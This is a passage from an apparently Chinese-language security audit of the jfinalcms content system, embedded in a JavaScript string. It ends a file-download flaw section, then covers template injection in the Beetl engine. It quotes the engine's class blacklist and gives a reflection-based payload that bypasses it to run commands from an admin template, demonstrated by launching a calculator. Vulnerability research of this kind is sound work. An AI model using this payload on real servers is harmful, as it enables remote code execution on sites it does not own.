            readFile(resp, file);
        } else {
            this.error(sprintf(lang("FILE_DOES_NOT_EXIST"), this.get.get("path")));
        }
    }
\`\`\`

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114320-611030e0-c729-1.png)

\u8BBE\u7F6E\u4E0B\u8F7D\u6587\u4EF6\u63A5\u7740\u8C03\u7528 readFile(resp, file); \u8BFB\u53D6\u6587\u4EF6

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114328-65c49f90-c729-1.png)

\u8BFB\u53D6\u6587\u4EF6\u5199\u5165\u6587\u4EF6\u4E0B\u8F7D\u3002

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114335-69a4ec28-c729-1.png)

## 9\u3001 SSTI\u6A21\u677F\u6CE8\u5165\u6F0F\u6D1E

\u5728 jfinalcms \u6A21\u677F\u4F7F\u7528\u7684\u662F beetl
\u5728\u540E\u53F0\u63D0\u4F9B\u4FEE\u6539\u6A21\u5757\u7684\u529F\u80FD

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114343-6ed6e818-c729-1.png)

\u8FD9\u4E2A\u662Fbeetl3 \u4F7F\u7528java\u4EE3\u7801\u7684\u8BF4\u660E[https://www.kancloud.cn/xiandafu/beetl3_guide/2138960](https://www.kancloud.cn/xiandafu/beetl3_guide/2138960)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114353-749d6b1e-c729-1.png)

\u53EF\u4EE5\u4F7F\u7528\${@\u7C7B.\u65B9\u6CD5}\u53EF\u4EE5\u901A\u8FC7\u8FD9\u79CD\u65B9\u6CD5\u5728\u7C7B\u4E2D\u4F7F\u7528java\u4EE3\u7801
\u800C\u4E14 java.lang.Runtime,\u548C java.lang.Process \u4E0D\u80FD\u5728\u80FD\u5F15\u64CE\u4E2D\u4F7F\u7528
\u672C\u5730\u8C03\u8BD5

\`\`\`
package org.example;
import org.beetl.core.Configuration;
import org.beetl.core.GroupTemplate;
import org.beetl.core.Template;
import org.beetl.core.resource.StringTemplateResourceLoader;
import java.io.IOException;
public class Main {
    public static void main(String[] args) throws IOException {
        StringTemplateResourceLoader resourceLoader = new StringTemplateResourceLoader();
        Configuration cfg = Configuration.defaultConfiguration();
        GroupTemplate gt = new GroupTemplate(resourceLoader, cfg);
        //\u83B7\u53D6\u6A21\u677F
        Template t = gt.getTemplate("hello,\${@Runtime.getRuntime().exec(\\"calc\\")}");
        t.binding("name", "beetl");
        //\u6E32\u67D3\u7ED3\u679C
        String str = t.render();
        System.out.println(str);
    }
}
\`\`\`

\u5224\u65AD\u5173\u952E\u8BCD \u76F4\u63A5\u8C03\u7528\u80AF\u5B9A\u662F\u4E0D\u884C\u7684\u4E86\u3002

\`\`\`
} else {
            String name = c.getName();
            String className = null;
            String pkgName = null;
            int i = name.lastIndexOf(46);
            if (i == -1) {
                return true;
            } else {
                pkgName = name.substring(0, i);
                className = name.substring(i + 1);
                return !pkgName.startsWith("java.lang") || !className.equals("Runtime") && !className.equals("Process") && !className.equals("ProcessBuilder") && !className.equals("System");
            }
        }
\`\`\`

\u53EF\u4EE5\u91C7\u7528\u53CD\u5C04\u8C03\u7528

\`\`\`
import java.lang.reflect.Method;
public class Main {
    public static void main(String[] args) throws Exception {
       Runtime.getRuntime().exec("calc");
        Class<?> aClass = Class.forName("java.lang.Runtime");
        Method exec = aClass.getMethod("exec", String.class);
        Method getRuntime = aClass.getMethod("getRuntime", null);
        Object getInvoke = getRuntime.invoke(null, null);
        exec.invoke(getInvoke,"calc");
        java.lang.Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc");
    }
}
\${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"calc")}
\`\`\`

\u5728\u540E\u53F0\u6A21\u677F\u4E2D\u6DFB\u52A0\u8FD9\u6BB5\u4EE3\u7801\u5C31\u53EF\u4EE5\u987A\u5229\u6267\u884C\u547D\u4EE4
\u8C03\u7528\u8BA1\u7B97\u5668\u6210\u529F

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114421-8543f104-c729-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20241231114427-88c0e2f6-c729-1.png)`;export{n as _};
